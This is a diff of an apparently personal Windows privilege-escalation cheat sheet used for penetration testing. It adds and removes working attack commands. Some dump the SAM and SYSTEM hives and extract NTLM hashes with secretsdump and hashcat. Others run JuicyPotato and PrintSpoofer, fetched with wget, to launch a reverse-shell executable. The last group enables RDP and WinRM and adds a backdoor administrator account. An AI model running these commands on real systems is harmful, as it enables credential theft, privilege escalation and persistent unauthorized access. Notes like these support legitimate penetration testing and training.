@@ -10,6 +10,14 @@ PS> cd $env:temp
 cmd> cd %TEMP%
 ```
 
+```cmd
+
+#check version
+
+systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
+
+```
+
 ## Enumeration
 
 Basic Strategy
@@ -26,7 +34,7 @@ Basic Strategy
 * Check files and folders looking for interesting files
 * look for internal ports
 * Check users
-* 
+
 
 ### Find Process and its ACL
 
@@ -498,29 +506,15 @@ If found then search in the directory for strings within files
 
 #### SAM/SYSTEM password hashes
 
-* dump SAM and SYSTEM to examine it with `samdump2`
+
+reg save HKLM\SAM C:\wamp64\attendance\images\test\SAM
+reg save HKLM\SYSTEM C:\wamp64\attendance\images\test\SYSTEM
 
 
-reg save HKLM\SAM c:\mimikatz_trunk\x64\SAM
-reg save HKLM\SYSTEM c:\mimikatz_trunk\x64\SYSTEM
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 
-Look for backups in
 
-`c:\Windows\System32\config` or
-
-`c:\Windows\System32\config\RegBack` or use winpeas
-
-`.\winpeas.exe quiet searchfast filesinfo`
-
-* Copy SAM and SYSTEM files to Kali
-
-* For Windows 2k/NT/XP get `samdump2`
-
-* For newer versions use pwdump 
-
-`python /usr/share/creddump7/pwdump.py SYSTEM SAM`
-
-* crack NTLM `hashcat -m 1000 --force hash /wordlist`
+* crack NTLM if needed `hashcat -m 1000 --force hash /wordlist`
 
 OR even better login directly win pth-winexe
 
@@ -589,42 +583,30 @@ oLink.Save
 * Look for possbible vulnerable apps using `seatbelt.exe` on victim or `tasklist /V` or `winpeas.exe quiet processinfo`
 * find the exploit on `exploit.db` as shown above
 
-#### Potatoes
-
-Works on Win 7,8 and early 10. Latest win 10 is patched.
-
-Relies on NTLM relay from auth to fake http server to SMB to get SYSTEM.
-
-* Execute potato
-
-```powershell
-
-.\potato.exe -ip 192.168.1.39 -cmd "C:\Temp\rev_shell.exe" -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true
-
-```
 
 #### Token Impersonation
 
-Patched on latest windows 10.
-
-* Need remote access to service accont like `nt authority\local service`
 * This shall tipically work if following privileges are available `SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege`
-* Next, find CLSID `http://ohpe.it/juicy-potato/CLSID/`
-* Copy juicy potato and run it
 
-For later versions use Rogue Potato.
+`juicypotato.exe -l 1333 -p C:\path\to\shellfile\rev1337.exe -t * -c "{6d18ad12-bde3-4393-b311-099c346e6df9}"`
 
-#### PrintSpoofer
+But there are also more thechniques such as printspoofer: https://juggernaut-sec.com/seimpersonateprivilege/
 
-* Works on newer machines.
-* needs `vc_redist.x64.exe`
-* Check priviliges for impersonation
-* Run exploit
+
+##### PrintSpoofer
+
+Windows Version 1607 onwards
 
 ```powershell
 
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe -O PrintSpoofer.exe
+
 .\PrintSpoofer.exe -i -c "c:\Temp\rev_shell.exe"
 ```
+
+* needs `vc_redist.x64.exe` and `vcruntime140.dll`, if failes
+
+
 
 ### Certificate exploits
 
@@ -871,23 +853,23 @@ Or connect as other service if needed from victim
 `Get-Childitem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`
 
 * enable RDP
-`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
 * add user
-`net user Pentester Password1 /ADD`
+net user Pentester Password1 /ADD
 
 * give admin rights
-`net localgroup Administrators Pentester /ADD`
+net localgroup Administrators Pentester /ADD
 
 * add to RDP group
 
-`powershell -nop -c "Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Pentester""`
+powershell -nop -c "Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Pentester""
 
-`net localgroup "Remote Desktop Users" Pentester /add`
+net localgroup "Remote Desktop Users" Pentester /add
 
 * Enable winrm to be evil
 
-`Enable-PSRemoting -SkipNetworkProfileCheck -Force`
+Enable-PSRemoting -SkipNetworkProfileCheck -Force
 
 OR
 
